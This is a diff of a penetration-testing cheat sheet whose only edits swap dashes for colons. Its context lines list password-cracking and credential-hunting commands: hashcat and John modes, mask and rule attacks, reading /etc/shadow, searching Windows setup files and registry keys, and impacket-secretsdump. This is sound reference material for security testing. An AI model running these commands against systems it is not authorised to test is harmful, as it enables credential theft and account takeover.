@@ -6,7 +6,7 @@ description = "Hashcat modes, John the Ripper, cracking common file formats, pas
 draft = false
 +++
 
-## Hashcat — Common Modes
+## Hashcat: Common Modes
 
 ```bash
 hashcat -m <mode> <hashfile> <wordlist> [options]
@@ -44,7 +44,7 @@ hashcat -m 1000 ntlm.txt rockyou.txt
 hashcat -m 13100 tgs.txt rockyou.txt
 hashcat -m 5600 netntlmv2.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 
-# Mask attack — 8-char, upper+lower+digit
+# Mask attack: 8-char, upper+lower+digit
 hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?d?d?d
 
 # Mask charsets: ?l=lower ?u=upper ?d=digit ?s=special ?a=all
@@ -111,11 +111,11 @@ john pfx.hash --wordlist=rockyou.txt
 ## Password Mutations
 
 ```bash
-# cewl — generate wordlist from website
+# cewl: generate wordlist from website
 cewl http://target.com -d 3 -m 6 -w cewl_words.txt
 cewl http://target.com -d 2 --with-numbers -w words.txt
 
-# Hashcat rules — best64 is a good starting point
+# Hashcat rules: best64 is a good starting point
 hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
 hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
 
@@ -138,9 +138,9 @@ hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.
 ## Linux Credential Hunting
 
 ```bash
-# /etc/shadow — needs root
+# /etc/shadow: needs root
 cat /etc/shadow
-# Format: user:$type$salt$hash — $1$=md5, $6$=sha512
+# Format: user:$type$salt$hash: $1$=md5, $6$=sha512
 
 # Copy to crack offline
 unshadow /etc/passwd /etc/shadow > unshadowed.txt
@@ -170,13 +170,13 @@ dir /s *password* *cred* *secret* 2>nul
 type C:\Windows\Panther\Unattend.xml
 type C:\Windows\System32\sysprep\sysprep.xml
 
-# Registry — autologon, wireless keys
+# Registry: autologon, wireless keys
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
 ```
 
 ```bash
-# From Linux — dump SAM via impacket
+# From Linux: dump SAM via impacket
 impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 impacket-secretsdump DOMAIN/user:pass@<target>
 
